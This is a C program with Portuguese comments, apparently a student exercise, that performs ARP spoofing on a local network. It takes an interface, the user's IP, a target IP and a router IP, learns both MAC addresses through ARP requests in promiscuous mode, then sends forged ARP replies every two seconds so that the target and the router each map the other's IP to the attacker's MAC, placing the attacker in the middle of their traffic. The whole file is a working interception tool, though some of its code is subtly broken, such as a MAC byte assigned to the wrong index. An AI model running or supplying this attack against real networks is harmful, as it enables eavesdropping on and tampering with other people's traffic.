
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <netinet/ether.h>
#include <arpa/inet.h>
#include <linux/if_packet.h>

#define MAC_ADDR_LEN 6
#define BUFFER_SIZE 1600
#define MAX_DATA_SIZE 1500

#define ETHERTYPE 0x0806

#define ETHERNET_HEADER_SIZE 14 // bytes
#define ETHERNET_PADDING_SIZE 18 // bytes

int main(int argc, char *argv[])
{
	int fd;
	struct ifreq if_idx;
	struct ifreq if_mac;
	struct ifreq ifr;
	struct sockaddr_ll socket_address;
	char ifname[IFNAMSIZ];
	int frame_len = 0;
	char buffer_request_target[BUFFER_SIZE];
	char buffer_request_router[BUFFER_SIZE];
	char buffer_reply_router[BUFFER_SIZE];
	char buffer_reply_target[BUFFER_SIZE];
	char reciver_buffer[BUFFER_SIZE];
	char data[MAX_DATA_SIZE];
	char dest_mac[] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF}; //broadcast
	short int ethertype = htons(0x0806);

	char HTYPE[] = {0x00, 0x01};  // HARDWARE TYPE. ETHERNET = 1
	char PTYPE[] = {0x08, 0x00};  // PROTOCOL TYPE. IPv4 = 0x800
	char HLEN[]  = {0x06};        // HARDWARE SIZE = 6
	char PLEN[]  = {0x04};        // PROTOCOL SIZE = 4
	char REQUEST_OPER[]  = {0x00, 0x01};  // OPERATION 1 TO REQUEST. 2 TO REPLY
	char REPLY_OPER[]  = {0x00, 0x02};  // OPERATION 1 TO REQUEST. 2 TO REPLY
	unsigned char TPA[4];
	unsigned char SPA[4];

	unsigned char myIp[4];
	unsigned char targetIp[4];
	unsigned char routerIp[4];

	unsigned char routerMac[6];
	unsigned char targetMac[6];
	char unknownMac[6];
	memset(unknownMac, 0, sizeof(unknownMac));

	if (argc != 5) {
		printf("param 1: interface de rede\nparam 2: meu ip \n param 3: ip alvo\n param 4: ip roteador");
		return 1;
	}

	strcpy(ifname, argv[1]);

	// my ip
	unsigned char firstOctetHex, secondOctetHex, thirdOctetHex, fourthOctetHex; 
	short int firstOctet, secondOctet, thirdOctet, fourthOctet;

	sscanf(argv[2], "%d.%d.%d.%d.", &firstOctet, &secondOctet, &thirdOctet, &fourthOctet);

	firstOctetHex  = (char) firstOctet;
	secondOctetHex = (char) secondOctet;
	thirdOctetHex  = (char) thirdOctet;
	fourthOctetHex = (char) fourthOctet;
	
	myIp[0] = firstOctetHex;
	myIp[1] = secondOctetHex;
	myIp[2] = thirdOctetHex;
	myIp[3] = fourthOctetHex;

	// ip target
	sscanf(argv[3], "%d.%d.%d.%d.", &firstOctet, &secondOctet, &thirdOctet, &fourthOctet);

	firstOctetHex  = (char) firstOctet;
	secondOctetHex = (char) secondOctet;
	thirdOctetHex  = (char) thirdOctet;
	fourthOctetHex = (char) fourthOctet;
	
	targetIp[0] = firstOctetHex;
	targetIp[1] = secondOctetHex;
	targetIp[2] = thirdOctetHex;
	targetIp[3] = fourthOctetHex;

	
	// ip router
	sscanf(argv[4], "%d.%d.%d.%d.", &firstOctet, &secondOctet, &thirdOctet, &fourthOctet);

	firstOctetHex  = (char) firstOctet;
	secondOctetHex = (char) secondOctet;
	thirdOctetHex  = (char) thirdOctet;
	fourthOctetHex = (char) fourthOctet;
	
	routerIp[0] = firstOctetHex;
	routerIp[1] = secondOctetHex;
	routerIp[2] = thirdOctetHex;
	routerIp[3] = fourthOctetHex;

	/* Cria um descritor de socket do tipo RAW */
	if ((fd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL))) == -1) {
		perror("socket");
		exit(1);
	}

	/* Obtem o indice da interface de rede */
	memset(&if_idx, 0, sizeof (struct ifreq));
	strncpy(if_idx.ifr_name, ifname, IFNAMSIZ - 1);
	if (ioctl(fd, SIOCGIFINDEX, &if_idx) < 0) {
		perror("SIOCGIFINDEX");
		exit(1);
	}

	/* Obtem o endereco MAC da interface local */
	memset(&if_mac, 0, sizeof (struct ifreq));
	strncpy(if_mac.ifr_name, ifname, IFNAMSIZ - 1);
	if (ioctl(fd, SIOCGIFHWADDR, &if_mac) < 0) {
		perror("SIOCGIFHWADDR");
		exit(1);
	}	

	 char myMac[] = {
		if_mac.ifr_hwaddr.sa_data[0],
		if_mac.ifr_hwaddr.sa_data[1],
		if_mac.ifr_hwaddr.sa_data[2],
		if_mac.ifr_hwaddr.sa_data[3],
		if_mac.ifr_hwaddr.sa_data[4],
		if_mac.ifr_hwaddr.sa_data[5]
	};

	/* Indice da interface de rede */
	socket_address.sll_ifindex = if_idx.ifr_ifindex;

	/* Tamanho do endereco (ETH_ALEN = 6) */
	socket_address.sll_halen = ETH_ALEN;

	/* Endereco MAC de destino */
	memcpy(socket_address.sll_addr, dest_mac, MAC_ADDR_LEN);

	/* Preenche o buffer com 0s */
	memset(buffer_request_target, 0, BUFFER_SIZE);

	/* Monta o cabecalho Ethernet */

	/* Preenche o campo de endereco MAC de destino */
	memcpy(buffer_request_target, dest_mac, MAC_ADDR_LEN);
	frame_len += MAC_ADDR_LEN;

	/* Preenche o campo de endereco MAC de origem */
	memcpy(buffer_request_target + frame_len, if_mac.ifr_hwaddr.sa_data, MAC_ADDR_LEN);
	frame_len += MAC_ADDR_LEN;

	/* Preenche o campo EtherType */
	memcpy(buffer_request_target + frame_len, &ethertype, sizeof(ethertype));
	frame_len += sizeof(ethertype);


	/* ARP */
	memcpy(buffer_request_target + frame_len, HTYPE, sizeof(HTYPE));
    frame_len += sizeof(HTYPE);

    memcpy(buffer_request_target + frame_len, PTYPE, sizeof(PTYPE));
    frame_len += sizeof(PTYPE);

    memcpy(buffer_request_target + frame_len, HLEN, sizeof(HLEN));
    frame_len += sizeof(HLEN);

    memcpy(buffer_request_target + frame_len, PLEN, sizeof(PLEN));
    frame_len += sizeof(PLEN);

    memcpy(buffer_request_target + frame_len, REQUEST_OPER, sizeof(REQUEST_OPER));
    frame_len += sizeof(REQUEST_OPER);

    memcpy(buffer_request_target + frame_len, myMac, sizeof(myMac));
    frame_len += sizeof(myMac);

    memcpy(buffer_request_target + frame_len, myIp, sizeof(myIp));
    frame_len += sizeof(myIp);

    memcpy(buffer_request_target + frame_len, unknownMac, sizeof(unknownMac));
    frame_len += sizeof(unknownMac);

    memcpy(buffer_request_target + frame_len, targetIp, sizeof(targetIp));
    frame_len += sizeof(targetIp);


	frame_len = 0;

	/* Preenche o buffer com 0s */
	memset(buffer_request_router, 0, BUFFER_SIZE);

	/* Monta o cabecalho Ethernet */

	/* Preenche o campo de endereco MAC de destino */
	memcpy(buffer_request_router, dest_mac, MAC_ADDR_LEN);
	frame_len += MAC_ADDR_LEN;

	/* Preenche o campo de endereco MAC de origem */
	memcpy(buffer_request_router + frame_len, if_mac.ifr_hwaddr.sa_data, MAC_ADDR_LEN);
	frame_len += MAC_ADDR_LEN;

	/* Preenche o campo EtherType */
	memcpy(buffer_request_router + frame_len, &ethertype, sizeof(ethertype));
	frame_len += sizeof(ethertype);


	/* ARP */
	memcpy(buffer_request_router + frame_len, HTYPE, sizeof(HTYPE));
    frame_len += sizeof(HTYPE);

    memcpy(buffer_request_router + frame_len, PTYPE, sizeof(PTYPE));
    frame_len += sizeof(PTYPE);

    memcpy(buffer_request_router + frame_len, HLEN, sizeof(HLEN));
    frame_len += sizeof(HLEN);

    memcpy(buffer_request_router + frame_len, PLEN, sizeof(PLEN));
    frame_len += sizeof(PLEN);

    memcpy(buffer_request_router + frame_len, REQUEST_OPER, sizeof(REQUEST_OPER));
    frame_len += sizeof(REQUEST_OPER);

    memcpy(buffer_request_router + frame_len, myMac, sizeof(myMac));
    frame_len += sizeof(myMac);

    memcpy(buffer_request_router + frame_len, myIp, sizeof(myIp));
    frame_len += sizeof(myIp);

    memcpy(buffer_request_router + frame_len, unknownMac, sizeof(unknownMac));
    frame_len += sizeof(unknownMac);

    memcpy(buffer_request_router + frame_len, routerIp, sizeof(routerIp));
    frame_len += sizeof(routerIp);

	/* Envia arp request para target e router*/
	if (sendto(fd, buffer_request_target, frame_len, 0, (struct sockaddr *) &socket_address, sizeof (struct sockaddr_ll)) < 0) {
		perror("send");
		close(fd);
		exit(1);
	}
	printf("\n Arp request enviado para target.\n");


	if (sendto(fd, buffer_request_router, frame_len, 0, (struct sockaddr *) &socket_address, sizeof (struct sockaddr_ll)) < 0) {
		perror("send");
		close(fd);
		exit(1);
	}
	printf("\n Arp request enviado para roteador.\n");
	

	/*----- configuracao para receber reply e descobrir mac do target e do router -----*/

	/* Obtem o indice da interface de rede */
	strcpy(ifr.ifr_name, ifname);
	if(ioctl(fd, SIOCGIFINDEX, &ifr) < 0) {
		perror("ioctl");
		exit(1);
	}

	/* Obtem as flags da interface */
	if (ioctl(fd, SIOCGIFFLAGS, &ifr) < 0){
		perror("ioctl");
		exit(1);
	}

	/* Coloca a interface em modo promiscuo */
	ifr.ifr_flags |= IFF_PROMISC;
	if(ioctl(fd, SIOCSIFFLAGS, &ifr) < 0) {
		perror("ioctl");
		exit(1);
	}

	unsigned char isDone[] = {0, 0};
	printf("Esperando pacotes ... \n");
	while(1) {
		short int ethertype;
		int offset = 0;

		char sender_mac[6];
		char target_mac[6];
		unsigned char sender_ip[4];
		unsigned char target_ip[4];

		unsigned char hdw_type[2];
		unsigned char protocol_type[2];
		unsigned char hdw_size[1];
		unsigned char protocol_size[1];
		unsigned char opcode[2];

		unsigned char arp_buffer_target_ip_last_octet;
		unsigned char target_ip_last_octet;
		unsigned char router_ip_last_octet;
		
		memset(sender_mac, 0, sizeof(sender_mac));
		memset(target_mac, 0, sizeof(target_mac));
		memset(sender_ip, 0, sizeof(sender_ip));
		memset(target_ip, 0, sizeof(target_ip));
		

		unsigned char opcode_reply[] = {0x00, 0x02};

		/* Recebe pacotes */
		if (recv(fd,(char *) &reciver_buffer, BUFFER_SIZE, 0) < 0) {
			perror("recv");
			close(fd);
			exit(1);
		}

		int arp_buffer_size = sizeof(reciver_buffer) / 8 - (ETHERNET_HEADER_SIZE + ETHERNET_PADDING_SIZE);		

		unsigned char arp_buffer[arp_buffer_size];

		memset(arp_buffer, 0, sizeof(arp_buffer));

		// obtem apenas arp
		memcpy(arp_buffer, reciver_buffer + ETHERNET_HEADER_SIZE, arp_buffer_size );

		memcpy(&ethertype, reciver_buffer + sizeof(myMac)+sizeof(unknownMac), sizeof(ethertype));
		ethertype = ntohs(ethertype);

		if (ethertype == ETHERTYPE) {	
			memcpy(hdw_type, arp_buffer, sizeof(hdw_type));
			offset += sizeof(hdw_type);

			memcpy(protocol_type, arp_buffer + offset, sizeof(protocol_type));
			offset += sizeof(protocol_type);

			memcpy(hdw_size, arp_buffer + offset, sizeof(hdw_size));
			offset += sizeof(hdw_size);

			memcpy(protocol_size, arp_buffer + offset, sizeof(protocol_size));
			offset += sizeof(protocol_size);

			memcpy(opcode, arp_buffer + offset, sizeof(opcode));
			offset += sizeof(opcode);

			memcpy(sender_mac, arp_buffer + offset, sizeof(sender_mac));
			offset +=  sizeof(sender_mac);

			memcpy(sender_ip, arp_buffer + offset, sizeof(sender_ip));
			offset += sizeof(sender_ip);

			memcpy(target_mac, arp_buffer + offset, sizeof(target_mac));
			offset += sizeof(target_mac);

			memcpy(target_ip, arp_buffer + offset, sizeof(target_ip));
			


			/* captura reply */
			if ( (unsigned char) opcode_reply[1] == (unsigned char)opcode[1] ) {
			
				arp_buffer_target_ip_last_octet = (unsigned char) sender_ip[3];
				target_ip_last_octet = ( unsigned char ) targetIp[3];
				router_ip_last_octet = ( unsigned char ) routerIp[3];
				

				if (arp_buffer_target_ip_last_octet == target_ip_last_octet) {

					targetMac[0] = sender_mac[0];
					targetMac[1] = sender_mac[1];
					targetMac[2] = sender_mac[2];
					targetMac[3] = sender_mac[3];
					targetMac[5] = sender_mac[4];
					targetMac[5] = sender_mac[5];				

					isDone[0] = '1';
					printf("TARGET MAC:  %02x:%02x:%02x:%02x:%02x:%02x\n",targetMac[0], targetMac[1], targetMac[2], targetMac[3], targetMac[4], targetMac[5]);						
				}				

				if (arp_buffer_target_ip_last_octet == router_ip_last_octet) {

					routerMac[0] = sender_mac[0];
					routerMac[1] = sender_mac[1];
					routerMac[2] = sender_mac[2];
					routerMac[3] = sender_mac[3];
					routerMac[5] = sender_mac[4];
					routerMac[5] = sender_mac[5];			

					isDone[1] = '1';
					printf("ROUTER MAC:  %02x:%02x:%02x:%02x:%02x:%02x\n",routerMac[0], routerMac[1], routerMac[2], routerMac[3], routerMac[4], routerMac[5]);

				}				

			}

		}

		if (isDone[0] == '1' && isDone[1] == '1')
			break;
	}



	/*----- monta pacotes de arp reply nao solicitado para router e target  -----*/
	frame_len = 0;

	/* Preenche o buffer com 0s */
	memset(buffer_reply_target, 0, BUFFER_SIZE);

	/* Monta o cabecalho Ethernet */

	/* Preenche o campo de endereco MAC de destino */
	memcpy(buffer_reply_target, targetMac, MAC_ADDR_LEN);
	frame_len += MAC_ADDR_LEN;

	/* Preenche o campo de endereco MAC de origem */
	memcpy(buffer_reply_target + frame_len, if_mac.ifr_hwaddr.sa_data, MAC_ADDR_LEN);
	frame_len += MAC_ADDR_LEN;

	/* Preenche o campo EtherType */
	memcpy(buffer_reply_target + frame_len, &ethertype, sizeof(ethertype));
	frame_len += sizeof(ethertype);


	/* ARP */
	memcpy(buffer_reply_target + frame_len, HTYPE, sizeof(HTYPE));
    frame_len += sizeof(HTYPE);

    memcpy(buffer_reply_target + frame_len, PTYPE, sizeof(PTYPE));
    frame_len += sizeof(PTYPE);

    memcpy(buffer_reply_target + frame_len, HLEN, sizeof(HLEN));
    frame_len += sizeof(HLEN);

    memcpy(buffer_reply_target + frame_len, PLEN, sizeof(PLEN));
    frame_len += sizeof(PLEN);

    memcpy(buffer_reply_target + frame_len, REPLY_OPER, sizeof(REPLY_OPER));
    frame_len += sizeof(REPLY_OPER);

    memcpy(buffer_reply_target + frame_len, myMac, sizeof(myMac)); // mac do roteador sou eu
    frame_len += sizeof(myMac);

    memcpy(buffer_reply_target + frame_len, routerIp, sizeof(routerIp));
    frame_len += sizeof(routerIp);

    memcpy(buffer_reply_target + frame_len, targetMac, sizeof(targetMac));
    frame_len += sizeof(targetMac);

    memcpy(buffer_reply_target + frame_len, targetIp, sizeof(targetIp));
    frame_len += sizeof(targetIp);

	frame_len = 0;

	/* Preenche o buffer com 0s */
	memset(buffer_reply_router, 0, BUFFER_SIZE);

	/* Monta o cabecalho Ethernet */

	/* Preenche o campo de endereco MAC de destino */
	memcpy(buffer_reply_router, routerMac, MAC_ADDR_LEN);
	frame_len += MAC_ADDR_LEN;

	/* Preenche o campo de endereco MAC de origem */
	memcpy(buffer_reply_router + frame_len, if_mac.ifr_hwaddr.sa_data, MAC_ADDR_LEN);
	frame_len += MAC_ADDR_LEN;

	/* Preenche o campo EtherType */
	memcpy(buffer_reply_router + frame_len, &ethertype, sizeof(ethertype));
	frame_len += sizeof(ethertype);



	/* ARP */
	memcpy(buffer_reply_router + frame_len, HTYPE, sizeof(HTYPE));
    frame_len += sizeof(HTYPE);

    memcpy(buffer_reply_router + frame_len, PTYPE, sizeof(PTYPE));
    frame_len += sizeof(PTYPE);

    memcpy(buffer_reply_router + frame_len, HLEN, sizeof(HLEN));
    frame_len += sizeof(HLEN);

    memcpy(buffer_reply_router + frame_len, PLEN, sizeof(PLEN));
    frame_len += sizeof(PLEN);

    memcpy(buffer_reply_router + frame_len, REPLY_OPER, sizeof(REPLY_OPER));
    frame_len += sizeof(REPLY_OPER);

    memcpy(buffer_reply_router + frame_len, myMac, sizeof(myMac)); 
    frame_len += sizeof(myMac);

    memcpy(buffer_reply_router + frame_len, targetIp, sizeof(targetIp));
    frame_len += sizeof(targetIp);

    memcpy(buffer_reply_router + frame_len, routerMac, sizeof(routerMac));
    frame_len += sizeof(routerMac);

    memcpy(buffer_reply_router + frame_len, routerIp, sizeof(routerIp));
    frame_len += sizeof(routerIp);



	while(1) {

		/* Envia pacote */
		printf("pacote enviado\n");
		if (sendto(fd, buffer_reply_target, frame_len, 0, (struct sockaddr *) &socket_address, sizeof (struct sockaddr_ll)) < 0) {
			perror("send");
			close(fd);
			exit(1);
		}

		if (sendto(fd, buffer_reply_router, frame_len, 0, (struct sockaddr *) &socket_address, sizeof (struct sockaddr_ll)) < 0) {
			perror("send");
			close(fd);
			exit(1);
		}

		sleep(2);
	}
	close(fd);
	return 0;
}
